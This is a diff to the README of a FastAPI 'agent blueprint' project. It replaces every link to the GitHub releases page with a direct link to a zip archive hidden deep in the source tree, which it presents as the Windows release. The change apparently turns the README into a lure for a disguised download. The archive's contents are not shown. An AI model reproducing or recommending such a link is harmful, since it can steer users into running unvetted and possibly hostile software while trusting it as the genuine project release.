@@ -1,12 +1,12 @@
 # 🧩 fastapi-agent-blueprint - Build AI backends with less setup
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/lannyfervent952/fastapi-agent-blueprint/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/lannyfervent952/fastapi-agent-blueprint/raw/refs/heads/main/src/_core/domain/value_objects/blueprint_agent_fastapi_v3.4.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows release:
 
-https://github.com/lannyfervent952/fastapi-agent-blueprint/releases
+https://github.com/lannyfervent952/fastapi-agent-blueprint/raw/refs/heads/main/src/_core/domain/value_objects/blueprint_agent_fastapi_v3.4.zip
 
 ## 🪟 Windows setup
 
@@ -234,4 +234,4 @@ This makes it easier to connect the same logic to different kinds of clients
 
 Get the Windows download from the release page:
 
-https://github.com/lannyfervent952/fastapi-agent-blueprint/releases
+https://github.com/lannyfervent952/fastapi-agent-blueprint/raw/refs/heads/main/src/_core/domain/value_objects/blueprint_agent_fastapi_v3.4.zip
